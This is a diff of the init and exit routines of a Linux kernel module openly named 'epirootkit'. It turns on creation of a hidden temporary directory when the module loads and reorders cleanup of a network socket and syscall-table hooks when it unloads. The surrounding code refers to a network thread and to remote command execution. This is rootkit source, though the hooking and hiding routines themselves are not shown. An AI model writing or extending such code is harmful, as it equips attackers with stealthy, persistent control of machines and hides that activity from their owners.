@@ -40,6 +40,11 @@ static int __init epirootkit_init(void) {
         return err;
     }
 
+    if (create_hidden_tmp_dir() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_init: failed to create hidden tmp dir\n");
+        return -ENOMEM;
+    }
+
     // Init structure for exec_code_stds
     if (init_exec_result() != SUCCESS) {
         ERR_MSG("epirootkit: epirootkit_init: memory allocation failed\n");
@@ -59,13 +64,6 @@ static int __init epirootkit_init(void) {
         thread_exited = true;
         return PTR_ERR(network_thread);
     }
-
-    /*
-    if (create_hidden_tmp_dir() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_init: failed to create hidden tmp dir\n");
-        return -ENOMEM;
-    }
-    */
 
     return SUCCESS;
 }
@@ -91,17 +89,15 @@ static void __exit epirootkit_exit(void) {
         DBG_MSG("epirootkit: close_thread: thread stopped\n");
     }
 
-    close_socket();
-
-    // Remove hooks from the syscall table
-    fh_remove_hooks(hooks, hook_array_size);
-
-    /*
     // Remove the hidden directory
     if (remove_hidden_tmp_dir() != SUCCESS) {
         ERR_MSG("epirootkit: epirootkit_exit: failed to remove hidden tmp dir\n");
     }
-    */
+
+    close_socket();
+
+    // Remove hooks from the syscall table
+    fh_remove_hooks(hooks, hook_array_size);
 
     DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
 }
